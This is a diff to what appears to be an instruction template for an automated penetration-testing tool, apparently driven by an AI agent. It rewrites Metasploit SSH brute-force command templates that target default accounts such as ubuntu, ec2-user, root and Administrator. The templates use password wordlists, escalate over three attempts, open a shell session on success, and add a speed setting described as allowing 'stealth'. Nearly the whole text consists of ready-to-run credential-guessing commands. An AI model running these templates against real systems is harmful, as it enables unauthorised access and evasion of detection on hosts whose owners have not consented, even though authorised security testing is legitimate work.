@@ -90,43 +90,39 @@ Based on the target service:
 
 **Ubuntu/Debian (including AWS EC2):**
 ```
-set RHOSTS <ip>; set RPORT 22; set USERNAME ubuntu; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+set RHOSTS <ip>; set RPORT 22; set USERNAME ubuntu; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
 ```
 
 **Amazon Linux/AWS:**
 ```
-set RHOSTS <ip>; set RPORT 22; set USERNAME ec2-user; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+set RHOSTS <ip>; set RPORT 22; set USERNAME ec2-user; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
 ```
 
 **Generic Linux (root):**
 ```
-set RHOSTS <ip>; set RPORT 22; set USERNAME root; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_roots.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+set RHOSTS <ip>; set RPORT 22; set USERNAME root; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_roots.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
 ```
 
 **Windows:**
 ```
-set RHOSTS <ip>; set RPORT 22; set USERNAME Administrator; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+set RHOSTS <ip>; set RPORT 22; set USERNAME Administrator; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
 ```
 
 #### Template for General Comprehensive (Attempt 2 - if Attempt 1 fails):
 ```
-set RHOSTS <ip>; set RPORT 22; set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+set RHOSTS <ip>; set RPORT 22; set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt; set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
 ```
 
 #### Template for Service-Specific (Attempt 3 - if Attempt 2 fails):
 ```
-set RHOSTS <ip>; set RPORT 22; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true
+set RHOSTS <ip>; set RPORT 22; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt; set STOP_ON_SUCCESS true; set VERBOSE true; set CreateSession true; set BRUTEFORCE_SPEED {bruteforce_speed}
 ```
 
 **Configuration options explained:**
 - **STOP_ON_SUCCESS=true**: Stop immediately when valid credentials found
 - **VERBOSE=true**: Show all login attempts (enables 2-min timeout detection)
 - **CreateSession=true**: Automatically open shell session on success (SSH only)
-
-**Speed settings (optional, add to command if needed):**
-```
-set BRUTEFORCE_SPEED 3
-```
+- **BRUTEFORCE_SPEED={bruteforce_speed}**: Delay between attempts (5=no delay, 0=5min/stealth) — configured in project settings
 
 ### Step 4: Verify configuration (OPTIONAL but recommended)
 ```
